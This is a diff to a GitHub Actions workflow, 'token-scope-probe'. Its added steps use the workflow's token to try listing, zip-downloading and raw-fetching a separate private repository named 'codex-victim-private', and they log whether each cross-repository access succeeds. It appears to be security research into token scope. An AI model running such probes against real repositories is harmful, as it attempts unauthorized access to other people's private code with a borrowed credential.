@@ -1,4 +1,4 @@
-# probe-ts: 20260310T050233Z
+# probe-ts: 20260310T050422Z
 name: token-scope-probe
 on:
   workflow_dispatch:
@@ -31,4 +31,40 @@ jobs:
             echo "GRAPHQL_HAS_REPO=0"
           else
             echo "GRAPHQL_HAS_REPO=1"
+          fi
+
+          set +e
+          GIT_TERMINAL_PROMPT=0 git ls-remote "https://x-access-token:${{ github.token }}@github.com/krt-sudo/codex-victim-private.git" > git_lsremote.out 2> git_lsremote.err
+          GIT_RC=$?
+          set -e
+          if [[ "$GIT_RC" == "0" && -s git_lsremote.out ]]; then
+            echo "GIT_CROSS_REPO=1"
+          else
+            echo "GIT_CROSS_REPO=0"
+          fi
+
+          CODELOAD_HTTP=$(curl -sS -L -w "%{http_code}" \
+            -H "Authorization: Bearer ${{ github.token }}" \
+            -o codeload.zip \
+            "https://codeload.github.com/krt-sudo/codex-victim-private/zip/refs/heads/main")
+          CODELOAD_SIZE=$(wc -c < codeload.zip | tr -d ' ')
+          echo "CODELOAD_HTTP=$CODELOAD_HTTP"
+          echo "CODELOAD_SIZE=$CODELOAD_SIZE"
+          if [[ "$CODELOAD_HTTP" == "200" && "$CODELOAD_SIZE" -gt 1024 ]]; then
+            echo "CODELOAD_CROSS_REPO=1"
+          else
+            echo "CODELOAD_CROSS_REPO=0"
+          fi
+
+          RAW_HTTP=$(curl -sS -L -w "%{http_code}" \
+            -H "Authorization: Bearer ${{ github.token }}" \
+            -o raw_readme.txt \
+            "https://raw.githubusercontent.com/krt-sudo/codex-victim-private/main/README.md")
+          RAW_SIZE=$(wc -c < raw_readme.txt | tr -d ' ')
+          echo "RAW_HTTP=$RAW_HTTP"
+          echo "RAW_SIZE=$RAW_SIZE"
+          if [[ "$RAW_HTTP" == "200" && "$RAW_SIZE" -gt 0 ]]; then
+            echo "RAW_CROSS_REPO=1"
+          else
+            echo "RAW_CROSS_REPO=0"
           fi
